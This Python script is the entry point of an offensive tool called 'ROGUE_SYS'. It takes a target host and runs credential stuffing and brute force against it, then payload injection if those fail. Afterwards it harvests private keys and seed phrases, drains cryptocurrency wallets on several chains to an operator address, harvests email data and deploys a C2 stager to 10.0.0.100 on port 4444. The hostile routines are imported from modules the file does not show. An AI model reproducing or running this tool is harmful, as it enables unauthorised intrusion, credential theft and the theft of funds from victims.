import asyncio
import sys
import time
import random
from modules.loader import load_wordlist
from modules.parser import parse_target_source
from modules.engine import run_autonomous_engine
from modules.replayer import replay_and_inject_payloads
from modules.dumper import harvest_email_intelligence
from modules.mail import send_breach_alert
from modules.payloads import deploy_c2_stager
from modules.keyharvester import harvest_private_keys
from modules.drainer import check_and_drain_wallet

# Cyberpunk Neon & Clean Structured Palette
CYAN = "\033[96m"
GREEN = "\033[92m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
DARK_GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"

BANNER = f"""{MATRIX_GREEN}{BOLD}
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
{RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL V5.0]
═════════════════════════════════════════════════════════════{RESET}
"""

def cyber_print(text, delay=0.01, color=MATRIX_GREEN):
    """Types text out smoothly with automated terminal scrolling."""
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()
    sys.stdout.write("\033[1S")

def main():
    sys.stdout.write("\033[2J\033[H")
    print(BANNER)
    
    cyber_print(f"{NEON_BLUE}[SYS_CORE] >> SECURE NEURAL INTERFACE ONLINE.{RESET}", 0.005)
    raw_target = input(f"{MATRIX_GREEN}{BOLD}[ROGUE_PROMPT] ⚡ Target Host / Domain / IP: {RESET}").strip()
    
    if not raw_target:
        cyber_print(f"{RED}[CRITICAL] Target parameter missing. Aborting protocol.{RESET}", 0.01)
        sys.exit(1)

    target = raw_target
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    target = target.split('/')[0].split(':')[0]

    # Clean block-tree structured output for target isolation
    print(f"\n{CYAN}[TARGET 1/1] → https://{target}{RESET}")
    print(f"       └── [STATUS] Target isolated and locked successfully.")
    cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
    
    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        cyber_print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}", 0.01)
        sys.exit(1)

    print(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.")

    # Step 1: Real-time DOM Inspection & Security Header Audit
    print(f"\n{CYAN}[RECON 2/2] → Executing DOM & Header Intelligence Scan{RESET}")
    try:
        asyncio.run(parse_target_source(target))
    except Exception as e:
        print(f"       └── [!] Notice during DOM parse: {e}")

    # Step 2: Launch Heavy Autonomous Engine (TCP Telemetry, Fuzzing, Surface Mapping, Credential Stuffing)
    hits, duration = asyncio.run(run_autonomous_engine(target, passwords))

    # Adaptive Pivot: If primary brute-force yields nothing, immediately trigger async replayer/injection
    if not hits:
        cyber_print(f"{YELLOW}[*] Primary perimeter held. Pivoting to neural payload injection & replaying...{RESET}", 0.005)
        asyncio.run(replay_and_inject_payloads(target))

    # Step 3: Post-Exploitation, Cryptographic Key Harvesting & Clean Structured Asset Auditing
    cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
    
    # 1. Harvest Private Keys & Seed Phrases
    keys_found = harvest_private_keys(".")
    
    # 2. Universal Multi-Asset Check & Automated Drainer Sweep (Matched to 5-value return tuple)
    drain_results = []
    total_artifacts = len(keys_found)
    
    for idx, key in enumerate(keys_found, 1):
        key_content = key.get("key_content")
        key_type = key.get("type")
        source_file = key.get("source")
        
        print(f"\n{CYAN}[TARGET {idx}/{total_artifacts}] → {source_file}{RESET}")
        print(f"       └── [AUDIT] Inspecting artifact type: {key_type}")
        print(f"       └── [DATA]  Key/Seed: {key_content[:18]}...")
        
        try:
            total_bal, drained, tx, chain_breakdown, operator_dest = check_and_drain_wallet(key_content)
            print(f"       └── [SUCCESS] Multi-Chain Balance Audited:")
            print(f"           ├── ETH/EVM : {chain_breakdown['evm']} ETH")
            print(f"           ├── SOL     : {chain_breakdown['sol']} SOL")
            print(f"           ├── BTC     : {chain_breakdown['btc']} BTC")
            print(f"           ├── LTC     : {chain_breakdown['ltc']} LTC")
            print(f"           ├── XRP     : {chain_breakdown['xrp']} XRP")
            print(f"           └── TRON    : {chain_breakdown['tron']} TRX")
            print(f"       └── [ROUTING] Operator Destination: {operator_dest[:12]}...{operator_dest[-6:]}")
            print(f"       └── [SWEEP STATUS] Drained: {drained} | TxHash: {tx[:16]}...")
            
            drain_results.append({
                "type": key_type,
                "artifact": key_content[:15] + "...", 
                "balance": total_bal, 
                "chains": chain_breakdown,
                "operator_destination": operator_dest,
                "drained": drained, 
                "tx": tx
            })
        except Exception as e:
            print(f"       └── [!] Multi-chain asset audit error: {e}")

    # 3. Dispatch Encrypted Email Intelligence & Alerts
    try:
        harvest_email_intelligence(target)
    except Exception:
        pass

    for hit in hits:
        try:
            send_breach_alert(target, hit)
        except Exception:
            pass
        
    # 4. Deploy Mobile C2 Stager Package
    try:
        deploy_c2_stager("10.0.0.100", 4444)
    except Exception:
        pass

    # Cyberpunk Completion Dashboard
    cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.003)
    cyber_print(f"{BOLD}{MATRIX_GREEN}[*] MISSION STATUS: COMPLETE (Elapsed: {duration:.2f}s){RESET}", 0.005)
    
    if hits:
        cyber_print(f"{BOLD}{BLINK}[+++] BREACH CONFIRMED: {len(hits)} authorization vectors successfully bypassed!{RESET}", 0.005)
        for idx, hit in enumerate(hits, 1):
            cyber_print(f" ├── Vector [{idx}]: Port {hit.get('port')} | Type: {hit.get('type')}", 0.005)
            cyber_print(f" │    User: {hit.get('user')} | Key: {hit.get('password')}{RESET}", 0.005)
    else:
        cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest reports compiled in plaintext.{RESET}", 0.005)
    
    cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.003)

if __name__ == "__main__":
    main()
